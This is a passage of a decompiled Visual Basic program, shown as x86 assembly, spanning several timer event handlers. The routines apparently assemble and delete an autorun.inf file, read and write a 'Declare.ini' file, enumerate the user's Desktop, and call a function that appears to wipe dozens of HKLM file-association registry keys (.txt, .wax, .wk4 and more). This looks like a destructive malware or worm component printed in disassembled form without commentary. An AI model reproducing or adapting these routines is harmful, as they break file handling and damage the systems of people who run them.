  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer5_Timer() '449630
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 0000003Ch
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 00401A00h ; Chr(37)
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  push 0041C17Ch
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  lea edx, var_38
  push edx
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 00000004h
  push 0041C18Ch
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000005h
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000320h]
  push eax
  lea ecx, var_3C
  push ecx
  call [00401078h]
  mov var_40, eax
  push 00000000h
  mov edx, var_40
  mov eax, [edx]
  mov ecx, var_40
  push ecx
  call [eax+0000005Ch]
  fnclex
  mov var_44, eax
  cmp var_44, 00000000h
  jge 004497D5h
  push 0000005Ch
  push 0041925Ch
  mov edx, var_40
  push edx
  mov eax, var_44
  push eax
  call [00401058h]
  mov var_5C, eax
  jmp 004497DCh
  mov var_5C, 00000000h
  lea ecx, var_3C
  call [004011D4h]
  mov var_10, 00000000h
  push 00449821h
  jmp 00449820h
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_30
  push eax
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  lea ecx, var_3C
  call [004011D4h]
  ret
  ret
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer7_Timer() '44A160
  push ebp
  mov ebp, esp
  sub esp, 00000014h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  sub esp, 000000D8h
  push ebx
  push esi
  push edi
  mov var_14, esp
  mov var_10, 00401AA8h
  mov esi, Me
  mov eax, esi
  and eax, 00000001h
  mov var_C, eax
  and esi, FFFFFFFEh
  mov Me, esi
  xor ebx, ebx
  mov var_8, ebx
  mov ecx, [esi]
  push esi
  call [ecx+00000004h]
  mov var_2C, ebx
  mov var_3C, ebx
  mov var_40, ebx
  mov var_44, ebx
  mov var_48, ebx
  mov var_4C, ebx
  mov var_5C, ebx
  mov var_6C, ebx
  mov var_7C, ebx
  mov var_8C, ebx
  mov var_9C, ebx
  mov var_AC, ebx
  mov var_BC, ebx
  push 00000001h
  call [00401070h]
  cmp [00460558h], ebx
  jnz 0044A1FBh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov edi, [00460558h]
  mov edx, [edi]
  lea eax, var_48
  push eax
  push edi
  call [edx+00000014h]
  fnclex
  cmp eax, ebx
  jge 0044A224h
  push 00000014h
  push 00418ED0h
  push edi
  push eax
  mov ebx, [00401058h]
  call ebx
  jmp 0044A22Ah
  mov ebx, [00401058h]
  mov eax, var_48
  mov edi, eax
  mov ecx, [eax]
  push 00000000h
  push eax
  call [ecx+0000007Ch]
  fnclex
  test eax, eax
  jge 0044A248h
  push 0000007Ch
  push 00418EF0h
  push edi
  push eax
  call ebx
  lea ecx, var_48
  call [004011D4h]
  mov eax, [00460558h]
  test eax, eax
  jnz 0044A26Ah
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov edi, [00460558h]
  mov edx, [edi]
  lea eax, var_48
  push eax
  push edi
  call [edx+00000014h]
  fnclex
  test eax, eax
  jge 0044A28Bh
  push 00000014h
  push 00418ED0h
  push edi
  push eax
  call ebx
  mov eax, var_48
  mov edi, eax
  mov ecx, [eax]
  lea edx, var_40
  push edx
  push eax
  call [ecx+00000050h]
  fnclex
  test eax, eax
  jge 0044A2ABh
  push 00000050h
  push 00418EF0h
  push edi
  push eax
  call ebx
  mov eax, var_40
  push eax
  push 0041C1BCh ; "\Declare.ini"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000001h
  call [0040112Ch]
  lea ecx, var_44
  push ecx
  lea edx, var_40
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  lea ecx, var_48
  call [004011D4h]
  mov edi, [00401078h]
  push 00000001h
  call [00401138h]
  test ax, ax
  push 00000001h
  jnz 0044A38Bh
  lea eax, var_3C
  push eax
  call [00401030h]
  mov var_A4, 00418DE4h
  mov var_AC, 00008008h
  lea ecx, var_3C
  push ecx
  lea edx, var_AC
  push edx
  call [00401168h]
  test ax, ax
  jz 0044A2F4h
  mov eax, [esi]
  push esi
  call [eax+00000338h]
  push eax
  lea ecx, var_48
  push ecx
  call edi
  mov edi, eax
  mov ebx, [edi]
  lea edx, var_3C
  push edx
  lea eax, var_40
  push eax
  call [00401118h]
  push eax
  push edi
  call [ebx+000000A4h]
  fnclex
  test eax, eax
  jge 0044A37Dh
  push 000000A4h
  push 00418EA4h
  push edi
  push eax
  call [00401058h]
  lea ecx, var_40
  call [004011CCh]
  jmp 0044A2E5h
  call [004010A0h]
  mov ecx, [esi]
  push esi
  call [ecx+00000338h]
  push eax
  lea edx, var_48
  push edx
  call edi
  mov ebx, eax
  mov eax, [ebx]
  lea ecx, var_40
  push ecx
  push ebx
  call [eax+000000A0h]
  fnclex
  test eax, eax
  jge 0044A3C8h
  push 000000A0h
  push 00418EA4h
  push ebx
  push eax
  call [00401058h]
  mov eax, var_40
  mov var_40, 00000000h
  mov var_54, eax
  mov ebx, 00000008h
  mov var_5C, ebx
  push 00000002h
  lea edx, var_5C
  push edx
  lea eax, var_6C
  push eax
  call [004011A4h]
  mov var_A4, 00000007h
  mov var_AC, 00000002h
  mov var_B4, 00000001h
  mov var_BC, 00008002h
  lea ecx, var_6C
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_7C
  push eax
  call [00401180h]
  push eax
  lea ecx, var_8C
  push ecx
  call [0040105Ch]
  push eax
  lea edx, var_BC
  push edx
  call [004010B8h]
  mov var_C8, ax
  lea ecx, var_48
  call [004011D4h]
  lea eax, var_7C
  push eax
  lea ecx, var_6C
  push ecx
  lea edx, var_5C
  push edx
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  cmp var_C8, 0000h
  jz 0044A5A5h
  mov eax, [esi]
  push esi
  call [eax+00000338h]
  push eax
  lea ecx, var_48
  push ecx
  call edi
  mov var_C0, eax
  mov edx, [eax]
  lea ecx, var_40
  push ecx
  push eax
  call [edx+000000A0h]
  fnclex
  test eax, eax
  jge 0044A4BCh
  push 000000A0h
  push 00418EA4h
  mov edx, var_C0
  push edx
  push eax
  call [00401058h]
  mov eax, [esi]
  push esi
  call [eax+00000334h]
  push eax
  lea ecx, var_4C
  push ecx
  call edi
  mov edi, eax
  mov var_B4, 0041C1DCh
  mov var_BC, ebx
  mov eax, var_40
  mov var_40, 00000000h
  mov var_54, eax
  mov var_5C, ebx
  push 00000002h
  lea edx, var_5C
  push edx
  lea eax, var_6C
  push eax
  call [004011A4h]
  mov var_A4, 00000007h
  mov var_AC, 00000002h
  mov ebx, [edi]
  lea ecx, var_BC
  push ecx
  lea edx, var_6C
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_7C
  push ecx
  call [00401180h]
  push eax
  lea edx, var_8C
  push edx
  call [0040111Ch]
  push eax
  lea eax, var_44
  push eax
  call [00401118h]
  push eax
  push edi
  call [ebx+000000A4h]
  fnclex
  test eax, eax
  jge 0044A569h
  push 000000A4h
  push 00418EA4h
  push edi
  push eax
  call [00401058h]
  lea ecx, var_44
  call [004011CCh]
  lea ecx, var_4C
  push ecx
  lea edx, var_48
  push edx
  push 00000002h
  call [0040102Ch]
  lea eax, var_8C
  push eax
  lea ecx, var_7C
  push ecx
  lea edx, var_6C
  push edx
  lea eax, var_5C
  push eax
  push 00000004h
  call [00401024h]
  add esp, 00000020h
  jmp 0044A69Eh
  mov ecx, [esi]
  push esi
  call [ecx+00000338h]
  push eax
  lea edx, var_48
  push edx
  call edi
  mov var_C0, eax
  mov ecx, [eax]
  lea edx, var_40
  push edx
  push eax
  call [ecx+000000A0h]
  fnclex
  test eax, eax
  jge 0044A5E6h
  push 000000A0h
  push 00418EA4h
  mov ecx, var_C0
  push ecx
  push eax
  call [00401058h]
  mov edx, [esi]
  push esi
  call [edx+00000334h]
  push eax
  lea eax, var_4C
  push eax
  call edi
  mov edi, eax
  mov eax, var_40
  mov var_40, 00000000h
  mov var_54, eax
  mov var_5C, ebx
  push 00000002h
  lea ecx, var_5C
  push ecx
  lea edx, var_6C
  push edx
  call [004011A4h]
  mov var_A4, 00000007h
  mov var_AC, 00000002h
  mov ebx, [edi]
  lea eax, var_6C
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_7C
  push edx
  call [00401180h]
  push eax
  lea eax, var_44
  push eax
  call [00401118h]
  push eax
  push edi
  call [ebx+000000A4h]
  fnclex
  test eax, eax
  jge 0044A66Eh
  push 000000A4h
  push 00418EA4h
  push edi
  push eax
  call [00401058h]
  lea ecx, var_44
  call [004011CCh]
  lea ecx, var_4C
  push ecx
  lea edx, var_48
  push edx
  push 00000002h
  call [0040102Ch]
  lea eax, var_7C
  push eax
  lea ecx, var_6C
  push ecx
  lea edx, var_5C
  push edx
  push 00000003h
  call [00401024h]
  add esp, 0000001Ch
  mov eax, [esi]
  push esi
  call [eax+00000330h]
  push eax
  lea ecx, var_48
  push ecx
  call [00401078h]
  mov esi, eax
  mov edx, [esi]
  push 00000000h
  push esi
  call [edx+0000005Ch]
  fnclex
  test eax, eax
  jge 0044AD2Fh
  jmp 0044AD20h
  mov eax, [00460558h]
  test eax, eax
  jnz 0044A6E4h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov esi, [00460558h]
  mov eax, [esi]
  lea ecx, var_48
  push ecx
  push esi
  call [eax+00000014h]
  fnclex
  test eax, eax
  jge 0044A70Dh
  push 00000014h
  push 00418ED0h
  push esi
  push eax
  mov edi, [00401058h]
  call edi
  jmp 0044A713h
  mov edi, [00401058h]
  mov eax, var_48
  mov esi, eax
  mov edx, [eax]
  push 00000000h
  push eax
  call [edx+0000007Ch]
  fnclex
  test eax, eax
  jge 0044A731h
  push 0000007Ch
  push 00418EF0h
  push esi
  push eax
  call edi
  lea ecx, var_48
  call [004011D4h]
  mov eax, [00460558h]
  test eax, eax
  jnz 0044A753h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov esi, [00460558h]
  mov eax, [esi]
  lea ecx, var_48
  push ecx
  push esi
  call [eax+00000014h]
  fnclex
  test eax, eax
  jge 0044A774h
  push 00000014h
  push 00418ED0h
  push esi
  push eax
  call edi
  mov eax, var_48
  mov esi, eax
  mov edx, [eax]
  lea ecx, var_40
  push ecx
  push eax
  call [edx+00000050h]
  fnclex
  test eax, eax
  jge 0044A794h
  push 00000050h
  push 00418EF0h
  push esi
  push eax
  call edi
  mov edx, var_40
  push edx
  push 0041C1BCh ; "\Declare.ini"
  mov edi, [00401044h]
  call edi
  mov edx, eax
  lea ecx, var_44
  mov ebx, [004011ACh]
  call ebx
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea eax, var_44
  push eax
  lea ecx, var_40
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  lea ecx, var_48
  call [004011D4h]
  lea edx, var_5C
  push edx
  call [00401178h]
  lea eax, var_5C
  push eax
  push 00000001h
  push 0041C1E4h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_5C
  call [00401014h]
  push 00000001h
  call [004010A0h]
  mov eax, [00460558h]
  test eax, eax
  jnz 0044A823h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov esi, [00460558h]
  mov ecx, [esi]
  lea edx, var_48
  push edx
  push esi
  call [ecx+00000014h]
  fnclex
  test eax, eax
  jge 0044A848h
  push 00000014h
  push 00418ED0h
  push esi
  push eax
  call [00401058h]
  mov eax, var_48
  mov esi, eax
  mov ecx, [eax]
  lea edx, var_40
  push edx
  push eax
  call [ecx+00000050h]
  fnclex
  test eax, eax
  jge 0044A86Ch
  push 00000050h
  push 00418EF0h
  push esi
  push eax
  call [00401058h]
  push 00000006h
  mov eax, var_40
  push eax
  push 0041C1BCh ; "\Declare.ini"
  call edi
  mov edx, eax
  lea ecx, var_44
  call ebx
  push eax
  call [004011D0h]
  lea ecx, var_44
  push ecx
  lea edx, var_40
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  lea ecx, var_48
  call [004011D4h]
  mov eax, [00460558h]
  test eax, eax
  jnz 0044A8BCh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov esi, [00460558h]
  mov eax, [esi]
  lea ecx, var_48
  push ecx
  push esi
  call [eax+00000014h]
  fnclex
  test eax, eax
  jge 0044A8E1h
  push 00000014h
  push 00418ED0h
  push esi
  push eax
  call [00401058h]
  mov eax, var_48
  mov esi, eax
  mov edx, [eax]
  lea ecx, var_40
  push ecx
  push eax
  call [edx+00000050h]
  fnclex
  test eax, eax
  jge 0044A905h
  push 00000050h
  push 00418EF0h
  push esi
  push eax
  call [00401058h]
  mov edx, var_40
  push edx
  push 0041C1BCh ; "\Declare.ini"
  call edi
  mov edx, eax
  lea ecx, var_44
  call ebx
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000001h
  call [0040112Ch]
  lea eax, var_44
  push eax
  lea ecx, var_40
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  lea ecx, var_48
  call [004011D4h]
  mov esi, Me
  mov edi, [00401078h]
  push 00000001h
  call [00401138h]
  test ax, ax
  push 00000001h
  jnz 0044A9E9h
  lea edx, var_2C
  push edx
  call [00401030h]
  mov var_A4, 00418DE4h
  mov var_AC, 00008008h
  lea eax, var_2C
  push eax
  lea ecx, var_AC
  push ecx
  call [00401168h]
  test ax, ax
  jz 0044A949h
  mov edx, [esi]
  push esi
  call [edx+00000338h]
  push eax
  lea eax, var_48
  push eax
  call edi
  mov edi, eax
  mov ebx, [edi]
  lea ecx, var_2C
  push ecx
  lea edx, var_40
  push edx
  call [00401118h]
  push eax
  push edi
  call [ebx+000000A4h]
  fnclex
  test eax, eax
  jge 0044A9D2h
  push 000000A4h
  push 00418EA4h
  push edi
  push eax
  call [00401058h]
  lea ecx, var_40
  call [004011CCh]
  lea ecx, var_48
  call [004011D4h]
  jmp 0044A943h
  call [004010A0h]
  mov eax, [esi]
  push esi
  call [eax+00000338h]
  push eax
  lea ecx, var_48
  push ecx
  call edi
  mov ebx, eax
  mov edx, [ebx]
  lea eax, var_40
  push eax
  push ebx
  call [edx+000000A0h]
  fnclex
  test eax, eax
  jge 0044AA26h
  push 000000A0h
  push 00418EA4h
  push ebx
  push eax
  call [00401058h]
  mov eax, var_40
  mov var_40, 00000000h
  mov var_54, eax
  mov ebx, 00000008h
  mov var_5C, ebx
  push 00000002h
  lea ecx, var_5C
  push ecx
  lea edx, var_6C
  push edx
  call [004011A4h]
  mov var_A4, 00000007h
  mov var_AC, 00000002h
  mov var_B4, 00000001h
  mov var_BC, 00008002h
  lea eax, var_6C
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_7C
  push edx
  call [00401180h]
  push eax
  lea eax, var_8C
  push eax
  call [0040105Ch]
  push eax
  lea ecx, var_BC
  push ecx
  call [004010B8h]
  mov var_C8, ax
  lea ecx, var_48
  call [004011D4h]
  lea edx, var_7C
  push edx
  lea eax, var_6C
  push eax
  lea ecx, var_5C
  push ecx
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  cmp var_C8, 0000h
  jz 0044AC03h
  mov edx, [esi]
  push esi
  call [edx+00000338h]
  push eax
  lea eax, var_48
  push eax
  call edi
  mov var_C0, eax
  mov ecx, [eax]
  lea edx, var_40
  push edx
  push eax
  call [ecx+000000A0h]
  fnclex
  test eax, eax
  jge 0044AB1Ah
  push 000000A0h
  push 00418EA4h
  mov ecx, var_C0
  push ecx
  push eax
  call [00401058h]
  mov edx, [esi]
  push esi
  call [edx+00000334h]
  push eax
  lea eax, var_4C
  push eax
  call edi
  mov edi, eax
  mov var_B4, 0041C1DCh
  mov var_BC, ebx
  mov eax, var_40
  mov var_40, 00000000h
  mov var_54, eax
  mov var_5C, ebx
  push 00000002h
  lea ecx, var_5C
  push ecx
  lea edx, var_6C
  push edx
  call [004011A4h]
  mov var_A4, 00000007h
  mov var_AC, 00000002h
  mov ebx, [edi]
  lea eax, var_BC
  push eax
  lea ecx, var_6C
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_7C
  push eax
  call [00401180h]
  push eax
  lea ecx, var_8C
  push ecx
  call [0040111Ch]
  push eax
  lea edx, var_44
  push edx
  call [00401118h]
  push eax
  push edi
  call [ebx+000000A4h]
  fnclex
  test eax, eax
  jge 0044ABC7h
  push 000000A4h
  push 00418EA4h
  push edi
  push eax
  call [00401058h]
  lea ecx, var_44
  call [004011CCh]
  lea eax, var_4C
  push eax
  lea ecx, var_48
  push ecx
  push 00000002h
  call [0040102Ch]
  lea edx, var_8C
  push edx
  lea eax, var_7C
  push eax
  lea ecx, var_6C
  push ecx
  lea edx, var_5C
  push edx
  push 00000004h
  call [00401024h]
  add esp, 00000020h
  jmp 0044ACFCh
  mov eax, [esi]
  push esi
  call [eax+00000338h]
  push eax
  lea ecx, var_48
  push ecx
  call edi
  mov var_C0, eax
  mov edx, [eax]
  lea ecx, var_40
  push ecx
  push eax
  call [edx+000000A0h]
  fnclex
  test eax, eax
  jge 0044AC44h
  push 000000A0h
  push 00418EA4h
  mov edx, var_C0
  push edx
  push eax
  call [00401058h]
  mov eax, [esi]
  push esi
  call [eax+00000334h]
  push eax
  lea ecx, var_4C
  push ecx
  call edi
  mov edi, eax
  mov eax, var_40
  mov var_40, 00000000h
  mov var_54, eax
  mov var_5C, ebx
  push 00000002h
  lea edx, var_5C
  push edx
  lea eax, var_6C
  push eax
  call [004011A4h]
  mov var_A4, 00000007h
  mov var_AC, 00000002h
  mov ebx, [edi]
  lea ecx, var_6C
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_7C
  push eax
  call [00401180h]
  push eax
  lea ecx, var_44
  push ecx
  call [00401118h]
  push eax
  push edi
  call [ebx+000000A4h]
  fnclex
  test eax, eax
  jge 0044ACCCh
  push 000000A4h
  push 00418EA4h
  push edi
  push eax
  call [00401058h]
  lea ecx, var_44
  call [004011CCh]
  lea edx, var_4C
  push edx
  lea eax, var_48
  push eax
  push 00000002h
  call [0040102Ch]
  lea ecx, var_7C
  push ecx
  lea edx, var_6C
  push edx
  lea eax, var_5C
  push eax
  push 00000003h
  call [00401024h]
  add esp, 0000001Ch
  mov ecx, [esi]
  push esi
  call [ecx+00000330h]
  push eax
  lea edx, var_48
  push edx
  call [00401078h]
  mov esi, eax
  mov eax, [esi]
  push 00000000h
  push esi
  call [eax+0000005Ch]
  fnclex
  test eax, eax
  jge 0044AD2Fh
  push 0000005Ch
  push 0041925Ch
  push esi
  push eax
  call [00401058h]
  lea ecx, var_48
  call [004011D4h]
  call [0040106Ch]
  push 0044AD9Ch
  jmp 0044AD8Bh
  lea ecx, var_44
  push ecx
  lea edx, var_40
  push edx
  push 00000002h
  call [00401150h]
  lea eax, var_4C
  push eax
  lea ecx, var_48
  push ecx
  push 00000002h
  call [0040102Ch]
  lea edx, var_9C
  push edx
  lea eax, var_8C
  push eax
  lea ecx, var_7C
  push ecx
  lea edx, var_6C
  push edx
  lea eax, var_5C
  push eax
  push 00000005h
  call [00401024h]
  add esp, 00000030h
  ret
  lea ecx, var_2C
  mov esi, [00401014h]
  call global_00401014
  lea ecx, var_3C
  call global_00401014
  ret
  mov eax, Me
  mov ecx, [eax]
  push eax
  call [ecx+00000008h]
  mov eax, var_C
  mov ecx, var_1C
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer8_Timer() '44ADC0
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 00000068h
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 00401AD0h ; Chr(37)
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  mov var_5C, 00419270h ; "userprofile"
  mov var_64, 00000008h
  lea edx, var_64
  lea ecx, var_34
  call [0040118Ch]
  lea edx, var_34
  push edx
  lea eax, var_44
  push eax
  call [00401064h]
  mov var_6C, 0041C1ECh ; "\Desktop\*.*"
  mov var_74, 00000008h
  lea ecx, var_44
  push ecx
  lea edx, var_74
  push edx
  lea eax, var_54
  push eax
  call [0040111Ch]
  push eax
  call [004010B4h]
  lea ecx, var_54
  push ecx
  lea edx, var_44
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  mov var_4, 00000004h
  push 0041C20Ch ; "SOFTWARE\Classes\.text"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000005h
  push 0041C240h ; "SOFTWARE\Classes\.txt\ShellNew"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000006h
  push 0041C284h ; "SOFTWARE\Classes\.txt\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000007h
  push 0041C2D8h ; "SOFTWARE\Classes\.txt"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000008h
  push 0041C308h ; "SOFTWARE\Classes\.vbp"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000009h
  push 0041C338h ; "SOFTWARE\Classes\.wax\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000000Ah
  push 0041C38Ch ; "SOFTWARE\Classes\.wax\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000000Bh
  push 0041C3DCh ; "SOFTWARE\Classes\.wax\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000000Ch
  push 0041C440h ; "SOFTWARE\Classes\.wax\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000000Dh
  push 0041C48Ch ; "SOFTWARE\Classes\.wax"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000000Eh
  push 0041C51Ch ; "SOFTWARE\Classes\.wb2\QuattroPro.Notebook.6\ShellNew"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000000Fh
  push 0041C58Ch ; "SOFTWARE\Classes\.wb2\QuattroPro.Notebook.6"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000010h
  push 0041C5E8h ; "SOFTWARE\Classes\.wb2\QuattroPro.Graph.6\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000011h
  push 0041C650h ; "SOFTWARE\Classes\.wb2\QuattroPro.Graph.6"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000012h
  push 0041C6A8h ; "SOFTWARE\Classes\.wb2"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000013h
  push 0041C4BCh ; "SOFTWARE\Classes\.wct"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000014h
  push 0041C6D8h ; "SOFTWARE\Classes\.webpnp"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000015h
  push 0041C710h ; "SOFTWARE\Classes\.WHT"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000016h
  push 0041C740h ; "SOFTWARE\Classes\.wk4\123Worksheet\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000017h
  push 0041C79Ch ; "SOFTWARE\Classes\.wk4\123Worksheet"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000018h
  push 0041C7E8h ; "SOFTWARE\Classes\.wk4"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000019h
  push 0041C818h ; "SOFTWARE\Classes\.wll\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000001Ah
  push 0041C86Ch ; "SOFTWARE\Classes\.wll"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000001Bh
  push 0041C89Ch ; "SOFTWARE\Classes\.wlt\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000001Ch
  push 0041C8F0h ; "SOFTWARE\Classes\.wlt"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000001Dh
